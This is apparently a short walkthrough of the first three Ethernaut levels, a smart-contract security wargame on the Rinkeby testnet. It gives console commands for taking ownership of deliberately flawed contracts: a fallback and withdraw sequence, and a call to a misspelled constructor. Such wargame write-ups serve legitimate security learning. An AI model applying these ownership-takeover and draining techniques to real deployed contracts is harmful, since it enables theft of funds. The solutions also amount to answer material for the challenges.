# Ethernaut
## 0. Hello Ethernaut
Basic level to familiarise yourself with the commands and the contracts interaction by using ubi public methods.
Also setting up your wallet and connecting to Rinkeby testnet.

Useful commands:
```
contract
contract.info()
```

## 1. Fallback
The goal is to claim ownership of the contract and reduce its balance to 0.

We need to specify values for contribute method otherwise the transfer is performed with no amount.

Useful commands:
```
contract.contribute({value:toWei("0.0009")})
contract.send({value:toWei("0.0009")})
contract.withdraw();
```

## 2. Fallout
The goal again is to claim ownership. This time we notice that misspelled function fal1out might help.

Useful commands:
```
contract.Fal1out({value:toWei("0.0001")})
```